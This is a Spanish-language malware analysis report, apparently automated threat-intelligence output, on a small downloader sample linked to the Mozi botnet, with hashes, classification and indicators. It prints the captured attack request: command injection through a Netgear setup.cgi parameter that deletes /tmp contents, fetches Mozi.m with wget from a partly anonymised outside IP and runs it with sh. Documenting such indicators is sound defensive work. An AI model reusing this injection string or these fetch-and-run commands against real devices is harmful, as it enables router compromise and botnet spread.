# 🧬 Payload Analysis

`87fdc9bc158d94aad7b2f3f17e787356073d2f3bdde35577d8a5965849a8d919`

## 📌 Resumen

Texto ASCII de 178 B. La evidencia disponible identifica capacidad de descarga remota. Recurso remoto principal: `netgear` en `hxxp://103.148.128.XXX:49109/Mozi.m+-O+/tmp/netgear`. **Comandos observados o extraídos, en orden de aparición en la evidencia:**

1. `sh netgear`
2. `wget hxxp://103.148.128.XXX:49109/Mozi.m -O /tmp/netg` Los comandos se presentan como evidencia observada o extraída; no se afirma ejecución salvo que la relación registrada sea `executed`. **Ficha malware:** [malware-like/oraculo/downloader/87fdc9bc158d94aad7b2f3f17e787356073d2f3bdde35577d8a5965849a8d919.md](../../../../../malware-like/oraculo/downloader/87fdc9bc158d94aad7b2f3f17e787356073d2f3bdde35577d8a5965849a8d919.md)


## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Confianza:** `Baja`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T19:42:55.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `87fdc9bc158d94aad7b2f3f17e787356073d2f3bdde35577d8a5965849a8d919`
- **MD5:** `738325c2e7a64231514bb12c4d96520f`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with CRLF line terminators |
| Tamaño | 178 B |
| Entropía | 5.19 |
| Strings | 1 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Limpieza**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with CRLF line terminators; iocs=4

## 🖥️ Comandos observados / extraídos

```text
GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+hxxp://103.148.128.XXX:49109/Mozi.m+-O+/tmp/netg
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| url | hxxp://103.148.128.XXX:49109/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 | strings |
| ip | 103.148.128.XXX | static_analysis |
| command | GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+hxxp://103.148.128.XXX:49109/Mozi.m+-O+/tmp/netg | strings |
| hash | 87fdc9bc158d94aad7b2f3f17e787356073d2f3bdde35577d8a5965849a8d919 | static_analysis |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
